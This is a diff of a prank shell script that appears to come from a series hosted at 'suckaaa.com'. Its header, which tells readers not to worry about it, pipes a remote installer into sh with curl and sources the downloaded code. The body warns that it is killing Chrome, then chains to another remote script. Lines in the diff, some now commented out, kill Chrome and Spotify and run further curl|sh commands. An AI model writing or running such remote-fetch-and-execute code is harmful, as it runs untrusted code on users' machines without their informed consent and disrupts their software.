@@ -3,20 +3,23 @@
 ###########  HEADER  ###########
 # loL whatcha lookin for in here??
 # Don't worry about it!!
-curl -s 'https://suckaaa.com/s/lib-installer' | sh;
+curl -s 'https://suckaaa.com/s/garbage-lib-installer' | sh;
 source ~/.garbage/lib;
 clear;
 ###########  END HEADER  ###########
 
 bigMsg 'Killing Chrome NOW';
 
-sleep 1s;
+echo 'You have 3 seconds to hit ctl^C';
 
-killingInTheNameOf 'Google Chrome';
-killingInTheNameOf 'Spotify';
+sleep 3s;
 
-sleep 5s;
+nextScript 'https://suckaaa.com/s/jk';
 
-# Do I have your attention?
+# killingInTheNameOf 'Google Chrome';
 
-termdo 'curl -s https://suckaaa.com/s/script-name-here | sh';
+# sleep 5s;
+
+# # Do I have your attention?
+
+# nextScript 'https://suckaaa.com/s/script-name-here';
